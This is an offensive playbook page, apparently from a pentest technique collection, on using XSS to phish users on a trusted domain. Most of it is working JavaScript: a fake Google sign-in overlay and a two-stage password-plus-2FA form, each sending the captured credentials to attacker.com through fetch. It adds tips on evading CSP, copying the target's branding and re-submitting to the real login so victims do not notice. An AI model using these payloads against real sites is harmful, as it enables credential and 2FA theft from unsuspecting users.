# XSS — Phishing Attacks

## When this applies

The XSS sink is on a trusted domain (the URL bar shows the legitimate site). The attacker injects a phishing overlay that exploits user trust — fake OAuth prompts, fake re-authentication dialogs, fake password-expiry notices. Because the chrome shows the real domain, victims rarely doubt the prompt.

## Technique

Inject a full-screen modal/iframe with a credential form. Submit handler captures values, exfiltrates to attacker, then dismisses the overlay (or redirects to the real login page) so the victim sees a "successful" outcome.

## Steps

### OAuth Phishing

```javascript
<script>
// Inject fake OAuth prompt
var overlay = document.createElement('div');
overlay.innerHTML = `
    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:99999; display:flex; align-items:center; justify-content:center;">
        <div style="background:white; padding:40px; border-radius:10px; max-width:400px;">
            <img src="https://target-site.com/logo.png" style="width:100px;">
            <h2>Continue with Google</h2>
            <p>This application needs access to your Google account</p>
            <form id="oauth-phish">
                <input type="email" placeholder="Email" required style="width:100%; padding:10px; margin:10px 0;">
                <input type="password" placeholder="Password" required style="width:100%; padding:10px; margin:10px 0;">
                <button style="width:100%; padding:10px; background:#4285f4; color:white; border:none; border-radius:5px;">Sign in</button>
            </form>
        </div>
    </div>
`;
document.body.appendChild(overlay);

document.getElementById('oauth-phish').onsubmit = function(e) {
    e.preventDefault();
    var email = this.querySelector('[type=email]').value;
    var pass = this.querySelector('[type=password]').value;

    fetch('https://attacker.com/phish', {
        method: 'POST',
        mode: 'no-cors',
        body: email + ':' + pass
    });

    overlay.remove();
};
</script>
```

### Session-Expired Overlay

Reuse the fake-login pattern from password capture (see `password-capture.md`):
- Hide the page (`body { display: none }`)
- Show a "Session expired — please re-authenticate" form
- Capture credentials
- Optionally re-submit to the real `/login` endpoint to avoid raising suspicion, then `location.reload()`

### Multi-Step Phishing (Email → 2FA)

```javascript
// Stage 1: capture email + password
form1.onsubmit = e => {
    e.preventDefault();
    capturedCreds = {user: ..., pass: ...};
    showStage2();
};

// Stage 2: capture 2FA code
form2.onsubmit = e => {
    e.preventDefault();
    fetch('https://attacker.com/phish', {
        method: 'POST', mode: 'no-cors',
        body: JSON.stringify({...capturedCreds, twofa: ...})
    });
    location.reload();
};
```

## Verifying success

- Attacker endpoint receives `email:password` (or full JSON in multi-step flow).
- Credentials authenticate against the real login endpoint.
- Victim sees expected post-login state (no error message, page reloads to logged-in dashboard).

## Common pitfalls

1. **Overlay z-index conflicts** — modern apps use high z-index for tooltips/dropdowns; use `z-index: 2147483647` (max int).
2. **Browser autofill fights the overlay** — password manager may decline to fill an injected form. Use placeholder names and remove `autocomplete="off"`.
3. **CSP blocks inline `<style>` and `onsubmit`** — restructure with attached event listeners and external CSS / nonce-approved style tags.
4. **No real authentication submission** — victim notices something's off when re-login doesn't happen. Always re-submit to the real `/login` after exfiltration.
5. **Logo / branding mismatch** — copy actual SVG/CSS from target site to make overlay convincing; victims notice generic styling.

## Tools

- **DevTools → Elements** — copy real login form HTML/CSS as a starting template
- **Burp Collaborator / attacker HTTP listener** — capture credentials POST
- **Browser headless mode** — automate render of overlay + screenshot for proof-of-concept
- **Original site's CSS classes** — reuse them in the overlay so look-and-feel matches
